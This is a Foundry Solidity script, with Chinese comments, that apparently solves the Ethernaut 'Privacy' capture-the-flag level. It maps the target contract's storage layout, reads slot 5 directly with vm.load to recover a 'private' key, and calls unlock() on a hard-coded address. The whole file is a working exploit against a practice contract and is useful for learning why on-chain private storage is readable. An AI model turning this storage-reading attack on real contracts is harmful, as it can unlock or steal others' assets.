// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
    function locked() external view returns (bool);
}

contract PrivacyAttackScript is Script {
    function run() external {
        address privacyLevel = 0x68CbeA9674E49DEeCa592C3BD02FdCBE8037f5F7;

        // data[2] 位于 slot 5
        // slot 0: locked (bool, 单独占一槽)
        // slot 1: ID (uint256)
        // slot 2: flattening + denomination + awkwardness (打包)
        // slot 3: data[0]
        // slot 4: data[1]
        // slot 5: data[2]
        // vm.load 是 Foundry 的 cheatcode（作弊码），用来直接读取任意合约的任意存储槽。

        bytes32 dataSlot2 = vm.load(privacyLevel, bytes32(uint256(5)));
        bytes16 key = bytes16(dataSlot2);

        console.logBytes32(dataSlot2);
        console.logBytes16(key);

        vm.startBroadcast();
        IPrivacy(privacyLevel).unlock(key);
        vm.stopBroadcast();

        console.log("locked:", IPrivacy(privacyLevel).locked());
    }
}
